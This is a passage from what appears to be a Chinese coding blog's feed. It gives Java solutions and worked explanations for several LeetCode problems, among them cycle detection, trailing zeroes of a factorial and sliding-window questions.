<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * class ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode next;</span><br><span class="line"> *     ListNode(int x) &#123;</span><br><span class="line"> *         val = x;</span><br><span class="line"> *         next = null;</span><br><span class="line"> *     &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">public class Solution &#123;</span><br><span class="line">    public ListNode detectCycle(ListNode head) &#123;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head;</span><br><span class="line">        while(fast!= null &amp;&amp; fast.next != null)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            if(slow == fast)&#123;</span><br><span class="line">                ListNode index1 = fast;</span><br><span class="line">                ListNode index2 = head;</span><br><span class="line"></span><br><span class="line">                while(index1 != index2)&#123;</span><br><span class="line">                    index1 = index1.next;</span><br><span class="line">                    index2 = index2.next;</span><br><span class="line">                &#125;</span><br><span class="line">                return index1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行用时：0 ms, 在所有 Java 提交中击败了100.00%的用户</li>
<li>内存消耗：41.4 MB, 在所有 Java 提交中击败了86.47%的用户</li>
<li>通过测试用例：16 &#x2F; 16</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>每日一题——April and March(part)</title>
    <url>/2022/04/07/13-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%20April%20and%20March(part)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下3月底、4月份每日一题记录，顺便督促自己打卡，仅记录每日一题~</p>
<p>（困难题型是否可以摸鱼呢？）</p>
<h2 id="172-阶乘后的零"><a href="#172-阶乘后的零" class="headerlink" title="172. 阶乘后的零"></a><a href="https://leetcode-cn.com/problems/factorial-trailing-zeroes/">172. 阶乘后的零</a></h2><p>题目描述：给定一个整数 <code>n</code> ，返回 <code>n!</code> 结果中尾随零的数量。提示 <code>n! = n * (n - 1) * (n - 2) * ... * 3 * 2 * 1</code></p>
<h3 id="自己的解法"><a href="#自己的解法" class="headerlink" title="自己的解法"></a>自己的解法</h3><p>最开始想的是阶乘求解之后，再去求末尾0的数量， 例如阶乘后的结果遍历对(10*j)求余，但发现执行到30就走不通了&#x3D; &#x3D;，就算给result赋值long类型也不够，因为会溢出。</p>
<h3 id="思路学习"><a href="#思路学习" class="headerlink" title="思路学习"></a>思路学习</h3><blockquote>
<p>首先末尾有多少个 0 ，只需要给当前数乘以一个 10 就可以加一个 0。</p>
<p>再具体对于 5!，也就是 5 * 4 * 3 * 2 * 1 &#x3D; 120，我们发现结果会有一个 0，原因就是 <strong>2 和 5 相乘</strong>构成了一个 10。而对于 10 的话，其实也只有 2 * 5 可以构成，所以我们<strong>只需要找有多少对 2&#x2F;5</strong>。</p>
<p>我们把每个乘数再稍微分解下，看一个例子。</p>
<p>11! &#x3D; 11 * 10 * 9 * 8 * 7 * 6 * 5 * 4 * 3 * 2 * 1 &#x3D; 11 * (2 * 5) * 9 * (4 * 2) * 7 * (3 * 2) * (1 * 5) * (2 * 2) * 3 * (1 * 2) * 1</p>
<p>对于含有 2 的因子的话是 1 * 2, 2 * 2, 3 * 2, 4 * 2 …</p>
<p>对于含有 5 的因子的话是 1 * 5, 2 * 5…</p>
<p>含有 2 的因子每两个出现一次，含有 5 的因子每 5 个出现一次，<strong>所有 2 出现的个数远远多于 5</strong>，换言之<strong>找到一个 5，一定能找到一个 2 与之配对</strong>。所以我们<strong>只需要找有多少个 5</strong>。</p>
<p>直接的，我们只需要判断<strong>每个累乘的数有多少个 5 的因子即可</strong>。</p>
<p>对于一个数的阶乘，就如之前分析的，5 的因子一定是每隔 5 个数出现一次，也就是下边的样子。</p>
<p>n! &#x3D; 1 * 2 * 3 * 4 * (1 * 5) * … * (2 * 5) * … * (3 * 5) *… * n</p>
<p>因为每隔 5 个数出现一个 5，所以计算出现了多少个 5，我们只需要用 <strong>n&#x2F;5</strong> 就可以算出来。</p>
<p>但还没有结束，继续分析。</p>
<p>… * (1 * 5) * … * (1 * 5 * 5) * … * (2 * 5 * 5) * … * (3 * 5 * 5) * … * n</p>
<p>每隔 25 个数字，<strong>出现的是两个 5</strong>，所以除了每隔 5 个数算作一个 5，<strong>每隔 25 个数，还需要多算一个 5。</strong></p>
<p>也就是我们需要再加上 n &#x2F; 25 个 5。</p>
<p>同理我们还会发现每隔 5 * 5 * 5 &#x3D; 125 个数字，会出现 3 个 5，所以我们还需要再加上 n &#x2F; 125 。</p>
<p>综上，规律就是每隔 5 个数，出现一个 5，每隔 25 个数，出现 2 个 5，每隔 125 个数，出现 3 个 5… 以此类推。</p>
<p>最终 5 的个数就是 n &#x2F; 5 + n &#x2F; 25 + n &#x2F; 125 …</p>
<p>写程序的话，如果直接按照上边的式子计算，<strong>分母可能会造成溢出</strong>。所以算 n &#x2F; 25 的时候，我们先把 n 更新，n &#x3D; n &#x2F; 5，然后再计算 n &#x2F; 5 即可。后边的同理。</p>
</blockquote>
<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trailingZeroes</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">          count += n / <span class="number">5</span>;</span><br><span class="line">          n = n/<span class="number">5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="682-棒球比赛"><a href="#682-棒球比赛" class="headerlink" title="682. 棒球比赛"></a><a href="https://leetcode-cn.com/problems/baseball-game/">682. 棒球比赛</a></h2><h3 id="思路——模拟栈"><a href="#思路——模拟栈" class="headerlink" title="思路——模拟栈"></a>思路——模拟栈</h3><p><strong>使用变长数组对栈进行模拟</strong>。</p>
<p>如果操作是 ++，那么访问数组的后两个得分，将两个得分之和加到总得分，并且将两个得分之和入栈。</p>
<p>如果操作是D，那么访问数组的最后一个得分，将得分乘以 2 加到总得分，并且将得分乘以 2入栈。</p>
<p>如果操作是 C，那么访问数组的最后一个得分，将总得分减去该得分，并且将该得分出栈。</p>
<p>如果操作是整数，那么将该整数加到总得分，并且将该整数入栈。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1000</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">calPoints</span><span class="params">(String[] ops)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> ops.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len ; i++ , idx++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(ops[i].equals(<span class="string">&quot;+&quot;</span>))&#123;</span><br><span class="line">                nums[idx] = nums[idx - <span class="number">1</span>]+nums[idx - <span class="number">2</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ops[i].equals(<span class="string">&quot;D&quot;</span>))&#123;</span><br><span class="line">                nums[idx] = <span class="number">2</span>*nums[idx-<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ops[i].equals(<span class="string">&quot;C&quot;</span>))&#123;</span><br><span class="line">                idx -= <span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums[idx] = Integer.parseInt(ops[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; idx ; j++)&#123;</span><br><span class="line">            result += nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2028-找出缺失的观测数据"><a href="#2028-找出缺失的观测数据" class="headerlink" title="2028. 找出缺失的观测数据"></a><a href="https://leetcode-cn.com/problems/find-missing-observations/">2028. 找出缺失的观测数据</a></h2><h3 id="思路：直接模拟"><a href="#思路：直接模拟" class="headerlink" title="思路：直接模拟"></a>思路：直接模拟</h3><p>最开始个人的代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int[] missingRolls(int[] rolls, int mean, int n) &#123;</span><br><span class="line">        int len = rolls.length;</span><br><span class="line">        int sum = mean*(len+n);</span><br><span class="line">        int[] res = new int[n];</span><br><span class="line">        for(int i = 0;i&lt;len ; i++ )&#123;</span><br><span class="line">            sum = sum - rolls[i];</span><br><span class="line">        &#125;</span><br><span class="line">        if((sum &lt; n)||(sum &gt; n * 6))&#123;</span><br><span class="line">            return new int[0];</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            int num = sum/n;</span><br><span class="line">            int end = sum%n;</span><br><span class="line">            if(end != 0)&#123;</span><br><span class="line">                res[0] = num+end;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                res[0] = num;</span><br><span class="line">            &#125;</span><br><span class="line">            for(int i = 1;i&lt;n ; i++)&#123;</span><br><span class="line">                res[i] = num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后发现几次没通过&#x3D; &#x3D;，原因出在这个示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[4,5,6,2,3,6,5,4,6,4,5,1,6,3,1,4,5,5,3,2,3,5,3,2,1,5,4,3,5,1,5]</span><br><span class="line">4</span><br><span class="line">40</span><br></pre></td></tr></table></figure>

<p>我的输出里面竟然构造了一个11，不符合题目1~6要求。。。</p>
<p>这是因为我把除法之后的余数全都分配在了一个数上面，当余数太大的时候肯定回超过范围，所以肯定要把余数分摊一下~（太蠢了）</p>
<p>以下是修改并优化后的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] missingRolls(<span class="type">int</span>[] rolls, <span class="type">int</span> mean, <span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> rolls.length;<span class="comment">//</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> mean*(len+n);</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;len ; i++ )&#123;</span><br><span class="line">            sum = sum - rolls[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((sum &lt; n)||(sum &gt; n * <span class="number">6</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sum / n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> sum % n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span> ; i&lt; n ; i++)&#123;</span><br><span class="line">            res[i] = num + ( i &lt; remain ? <span class="number">1</span> : <span class="number">0</span>);<span class="comment">//关键点！</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设缺失的部分和是：11，要分配给4个位置。那么11&#x2F;4 &#x3D; 2&#96;&#96;&#96;3，那么4个位置中，分配3个2+1，最后一个分配2+0，即可得到要求，这也是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">res[i] = num + ( i &lt; remain ? <span class="number">1</span> : <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这行代码的用处：将很大的余数分配给数组中一定数量的元素。</p>
<h2 id="693-交替位二进制数"><a href="#693-交替位二进制数" class="headerlink" title="693. 交替位二进制数"></a><a href="https://leetcode-cn.com/problems/binary-number-with-alternating-bits/">693. 交替位二进制数</a></h2><h3 id="思路——两个条件限制交替位二进制数"><a href="#思路——两个条件限制交替位二进制数" class="headerlink" title="思路——两个条件限制交替位二进制数"></a>思路——两个条件限制交替位二进制数</h3><ul>
<li>1、对输入 n 的二进制表示右移一位后，得到的数字再与 n<strong>按位异或</strong>得到 a。当且仅当输入 n 为<strong>交替位二进制数</strong>时，a 的二进制表示全为 1（不包括前导 0）</li>
<li>2、将 a与 a + 1 按位与，当且仅当 a的二进制表示全为 1 时，结果为 0：当且仅当 a 的二进制表示全为 1 时，a + 1可以进位，并将原最高位置为 0，按位与的结果为 0。否则，不会产生进位，两个最高位都为 1，相与结果不为 0。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasAlternatingBits</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> n ^ (n &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (a &amp; (a+<span class="number">1</span>)) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2024-考试的最大困扰度"><a href="#2024-考试的最大困扰度" class="headerlink" title="2024. 考试的最大困扰度"></a><a href="https://leetcode-cn.com/problems/maximize-the-confusion-of-an-exam/">2024. 考试的最大困扰度</a></h2><blockquote>
<p>给你一个字符串 answerKey ，其中 answerKey[i] 是第 i 个问题的正确结果。除此以外，还给你一个整数 k ，表示你能进行以下操作的最多次数：</p>
<p>每次操作中，将问题的正确答案改为 ‘T’ 或者 ‘F’ （也就是将 answerKey[i] 改为 ‘T’ 或者 ‘F’ ）。<br>请你返回在不超过 k 次操作的情况下，最大 连续 ‘T’ 或者 ‘F’ 的数目</p>
</blockquote>
<h3 id="思路——滑动窗口"><a href="#思路——滑动窗口" class="headerlink" title="思路——滑动窗口"></a>思路——滑动窗口</h3><p>题目求修改次数不超过k的前提下，连续段“T” 或“F”的最大长度，也就是等价于：</p>
<p>求一个包含“T”和“F”的个数不超过k的最大长度窗口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    String s;</span><br><span class="line">    <span class="type">int</span> n ,_k;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxConsecutiveAnswers</span><span class="params">(String answerKey, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        s = answerKey;</span><br><span class="line">        n = s.length();</span><br><span class="line">        _k = k;</span><br><span class="line">        <span class="keyword">return</span> Math.max(getCount(<span class="string">&#x27;T&#x27;</span>),getCount(<span class="string">&#x27;F&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCount</span><span class="params">(<span class="type">char</span> c)</span>&#123;<span class="comment">//滑动窗口找个数不超过k的最大长度窗口</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , j = <span class="number">0</span> , count = <span class="number">0</span>; i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == c)&#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(count &gt; _k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s.charAt(j) == c)&#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.max(ans,i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>由于滑动窗口这类题目很多，所以扩展一下以下题目：</p>
<h2 id="1004-最大连续1的个数-III"><a href="#1004-最大连续1的个数-III" class="headerlink" title="1004. 最大连续1的个数 III"></a><a href="https://leetcode-cn.com/problems/max-consecutive-ones-iii/">1004. 最大连续1的个数 III</a></h2><blockquote>
<p>给定一个二进制数组 <code>nums</code> 和一个整数 <code>k</code>，如果可以翻转最多 <code>k</code> 个 <code>0</code> ，则返回 <em>数组中连续 <code>1</code> 的最大个数</em> 。</p>
<p>输入：nums &#x3D; [1,1,1,0,0,0,1,1,1,1,0], K &#x3D; 2<br>输出：6<br>解释：[1,1,1,0,0,1,1,1,1,1,1]<br>粗体数字从 0 翻转到 1，最长的子数组长度为 6。</p>
</blockquote>
<p>和刚刚那个题目一样，只不过找T和F中最大的那个变为了只找包含0最大的窗口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> n , _k;</span><br><span class="line">    <span class="type">int</span>[] num ;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestOnes</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        num = nums;</span><br><span class="line">        n = nums.length;</span><br><span class="line">        _k = k;</span><br><span class="line">        <span class="keyword">return</span> getNums();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNums</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> , j = <span class="number">0</span> ,count = <span class="number">0</span> ; i &lt; n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i] == <span class="number">0</span>)&#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(count &gt; _k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(num[j] == <span class="number">0</span>)&#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.max(ans , i-j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character,Integer&gt; myMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Character,Integer&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//用于记录最大不重复子串的长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//滑动窗口左指针</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i&lt;s.length();i++)&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment"> 1、首先，判断当前字符是否包含在map中，如果不包含，将该字符添加到map（字符，字符在数组下标）,</span></span><br><span class="line"><span class="comment">   此时没有出现重复的字符，左指针不需要变化。此时不重复子串的长度为：i-left+1，与原来的maxLen比较，取最大值；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> 2、如果当前字符 ch 包含在 map中，此时有2类情况：</span></span><br><span class="line"><span class="comment">   1）当前字符包含在当前有效的子段中，如：abca，当我们遍历到第二个a，当前有效最长子段是 abc，我们又遍历到a，那么此时更新 left 为 map.get(a)+1=1，当前有效子段更新为 bca；</span></span><br><span class="line"><span class="comment">   2）当前字符不包含在当前最长有效子段中，如：abba，我们先添加a,b进map，此时left=0，我们再添加b，发现map中包含b，</span></span><br><span class="line"><span class="comment">   而且b包含在最长有效子段中，就是1）的情况，我们更新 left=map.get(b)+1=2，此时子段更新为 b，而且map中仍然包含a，map.get(a)=0；随后，我们遍历到a，发现a包含在map中，且map.get(a)=0，如果我们像1）一样处理，就会发现 left=map.get(a)+1=1，实际上，left此时应该不变，left始终为2，子段变成 ba才对。</span></span><br><span class="line"><span class="comment">	为了处理以上2类情况，我们每次更新left，left=Math.max(left , map.get(ch)+1).另外，更新left后，不管原来的 s.charAt(i) 是否在最长子段中，我们都要将 s.charAt(i) 的位置更新为当前的i，</span></span><br><span class="line"><span class="comment">因此此时新的 s.charAt(i) 已经进入到 当前最长的子段中！</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span>(myMap.containsKey(s.charAt(i)))&#123;</span><br><span class="line">                left = Math.max(left , myMap.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            myMap.put(s.charAt(i),i);</span><br><span class="line">            max = Math.max(max , i-left+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="728-自除数"><a href="#728-自除数" class="headerlink" title="728. 自除数"></a><a href="https://leetcode-cn.com/problems/self-dividing-numbers/">728. 自除数</a></h2><blockquote>
<p>自除数 是指可以被它包含的每一位数整除的数。</p>
<p>例如，128 是一个 自除数 ，因为 128 % 1 &#x3D;&#x3D; 0，128 % 2 &#x3D;&#x3D; 0，128 % 8 &#x3D;&#x3D; 0。<br>自除数 不允许包含 0 。</p>
<p>给定两个整数 <code>left</code> 和 <code>right</code> ，返回一个列表，<em>列表的元素是范围 <code>[left, right]</code> 内所有的 <strong>自除数</strong></em> </p>
</blockquote>
<p>思路——直接模拟</p>
<p>关键点在于：</p>
<p>判断一个整数是否为自除数的方法是遍历整数的每一位，判断每一位数是否为 0 以及是否可以<strong>整除</strong>该整数。</p>
<p>遍历整数的每一位的方法是，每次将当前整数<strong>对 10 取模</strong>即可得到当前整数的最后一位，然后将整数除以 10。重复该操作，直到当前整数变成 0 时即遍历了整数的每一位。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">selfDividingNumbers</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">       List&lt;Integer&gt;ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       out:<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left ; i &lt;= right ; i++)&#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">cur</span> <span class="operator">=</span> i ;</span><br><span class="line">           <span class="keyword">while</span>(cur != <span class="number">0</span>)&#123;</span><br><span class="line">               <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> cur % <span class="number">10</span>;</span><br><span class="line">               <span class="keyword">if</span>(t == <span class="number">0</span> || i %t != <span class="number">0</span>)&#123;</span><br><span class="line">                   <span class="keyword">continue</span> out;</span><br><span class="line">               &#125;</span><br><span class="line">               cur /= <span class="number">10</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           ans.add(i);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="954-二倍数对数组"><a href="#954-二倍数对数组" class="headerlink" title="954. 二倍数对数组"></a><a href="https://leetcode-cn.com/problems/array-of-doubled-pairs/">954. 二倍数对数组</a></h2><blockquote>
<p>给定一个长度为偶数的整数数组 arr，只有对 arr 进行重组后可以满足 “对于每个 0 &lt;&#x3D; i &lt; len(arr) &#x2F; 2，都有 arr[2 * i + 1] &#x3D; 2 * arr[2 * i]” 时，返回 true；否则，返回 false。</p>
</blockquote>
<h3 id="思路：哈希表-排序"><a href="#思路：哈希表-排序" class="headerlink" title="思路：哈希表+排序"></a>思路：哈希表+排序</h3><p>思路没有什么问题，就是不知道如何实现，另外就是排序没有思考到这个电上，下面是我自己的代码&#x3D; &#x3D;肯定有问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canReorderDoubled</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length ;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//要满足的个数</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; hashtable = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> ; i &lt; len ; i++ )&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashtable.containsKey(arr[i]/<span class="number">2</span>)||hashtable.containsKey(arr[i]*<span class="number">2</span>))&#123;</span><br><span class="line">                num++;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable.put(arr[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( num == (arr.length&gt;&gt;<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面附上学习之后的代码：</p>
<blockquote>
<p>依题意，我们首先对每个元素的出现次数用哈希表进行维护，然后用一个 list 存储其中的各个元素。然后遍历各个元素，对于每个元素 key判断是否有足够的 2k ，如果有，更新 2k 的数量；如果没有，返回 false 。</p>
<p><strong>要注意的是，由于map的无序性，会导致遍历时可能会从中间元素开始遍历，此时后面的数就会受到影响。所以，我们要从小的元素开始遍历，以确保元素匹配的正确性。</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canReorderDoubled</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Integer,Integer&gt;();</span><br><span class="line">        <span class="comment">//Map是用来维护数组中元素出现的个数的，也就是映射是元素-&gt;个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x : arr)&#123;</span><br><span class="line">            map.put(x , map.getOrDefault(x , <span class="number">0</span>)+<span class="number">1</span>);<span class="comment">//出现重复的则个数+1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//表用来存map中的key值，也就是元素</span></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(map.keySet());</span><br><span class="line">        <span class="comment">//例:[10,20,40,80]</span></span><br><span class="line">        <span class="comment">//由于map的无序性,导致遍历时可能会从中间开始遍历(20)</span></span><br><span class="line">        <span class="comment">//此时后面的数(40)就会收到影响</span></span><br><span 